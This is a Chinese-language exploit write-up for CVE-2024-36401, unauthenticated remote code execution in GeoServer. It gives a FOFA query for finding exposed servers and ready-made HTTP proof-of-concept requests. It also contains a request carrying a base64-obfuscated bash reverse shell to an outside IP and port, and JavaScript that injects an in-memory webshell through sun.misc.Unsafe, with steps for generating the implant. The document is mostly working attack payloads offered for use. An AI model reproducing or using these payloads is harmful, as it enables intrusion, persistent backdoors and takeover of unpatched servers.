## GeoServer属性名表达式前台代码执行漏洞(CVE-2024-36401)

GeoServer 是 OpenGIS Web 服务器规范的 J2EE 实现，利用 GeoServer 可以方便的发布地图数据，允许用户对特征数据进行更新、删除、插入操作。

在GeoServer 2.25.1， 2.24.3， 2.23.5版本及以前，未登录的任意用户可以通过构造恶意OGC请求，在默认安装的服务器中执行XPath表达式，进而利用执行Apache Commons Jxpath提供的功能执行任意代码。

## fofa

```
app="GeoServer"
```

## poc

```yaml
GET /geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'touch%20/tmp/success1') HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Connection: close
Cache-Control: max-age=0

```

```yaml
POST /geoserver/wfs HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/xml
Content-Length: 356

<wfs:GetPropertyValue service='WFS' version='2.0.0'
 xmlns:topp='http://www.openplans.org/topp'
 xmlns:fes='http://www.opengis.net/fes/2.0'
 xmlns:wfs='http://www.opengis.net/wfs/2.0'>
  <wfs:Query typeNames='sf:archsites'/>
  <wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'touch /tmp/success2')</wfs:valueReference>
</wfs:GetPropertyValue>
```

![1](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407030846166.png)

## 反弹shell

```yaml
POST /geoserver/wfs HTTP/1.1
Host: 192.168.18.131:8080
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/xml
Content-Length: 356

<wfs:GetPropertyValue service='WFS' version='2.0.0'
 xmlns:topp='http://www.openplans.org/topp'
 xmlns:fes='http://www.opengis.net/fes/2.0'
 xmlns:wfs='http://www.opengis.net/wfs/2.0'>
  <wfs:Query typeNames='sf:archsites'/>
  <wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'bash -c {echo,c2ggLWkgPiYgL2Rldi90Y3AvMTAuMjEuNjkuMTYvODA4NSAwPiYx}|{base64,-d}|{bash,-i}')
</wfs:valueReference>
</wfs:GetPropertyValue>
```

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407051256200.png)

## jdk11 注入内存马

jdk17 版本注入内存马不成功

环境：https://zenlayer.dl.sourceforge.net/project/geoserver/GeoServer/2.25.1/geoserver-2.25.1-bin.zip?viasf=1

```java
POST /geoserver/wfs HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/xml
Content-Length: 356

<wfs:GetPropertyValue service='WFS' version='2.0.0'
 xmlns:topp='http://www.openplans.org/topp'
 xmlns:fes='http://www.opengis.net/fes/2.0'
 xmlns:wfs='http://www.opengis.net/wfs/2.0'>
  <wfs:Query typeNames='sf:archsites'/>
  <wfs:valueReference>eval(getEngineByName(javax.script.ScriptEngineManager.new(),'js'),'
var str="内存马base64";
var bt;
try {
    bt = java.lang.Class.forName("sun.misc.BASE64Decoder").newInstance().decodeBuffer(str);
} catch (e) {
    bt = java.util.Base64.getDecoder().decode(str);
}
var theUnsafe = java.lang.Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
theUnsafe.setAccessible(true);
unsafe = theUnsafe.get(null);
unsafe.defineAnonymousClass(java.lang.Class.forName("java.lang.Class"), bt, null).newInstance();
')</wfs:valueReference>
</wfs:GetPropertyValue>
```

使用jmg工具生成内存马

![image-20240705150433570](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407051516724.png)



将生成的内存马base64填入到`var str="内存马base64";`

![image-20240705150510773](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407051517580.png)

![image-20240705150611691](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407051517614.png)



## 漏洞来源

- https://github.com/vulhub/vulhub/blob/master/geoserver/CVE-2024-36401/README.zh-cn.md
- https://yzddmr6.com/posts/geoserver-memoryshell/